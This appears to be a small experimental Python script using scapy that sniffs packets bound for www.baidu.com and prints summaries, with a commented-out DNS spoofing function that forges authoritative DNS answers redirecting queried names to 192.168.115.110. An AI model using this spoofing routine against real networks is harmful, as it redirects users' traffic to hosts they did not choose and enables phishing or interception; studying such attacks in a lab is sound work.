from scapy.all import *


def dns_spoof(pkt: Packet):
    send(pkt)
    
    print("Sent:", pkt.summary())
    
    return 1

# def dns_spoof(pkt):
#     redirect_to = '192.168.115.110'
#     if pkt.haslayer(DNSQR): # DNS question record
#         spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
#                       UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
#                       DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
#                       an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
#         send(spoofed_pkt)
sniff(
    filter="dst host www.baidu.com",
    iface="WLAN",
    store=0,
    prn=lambda pkt: "%s: %s" % (pkt.sniffed_on, pkt.summary()),
)
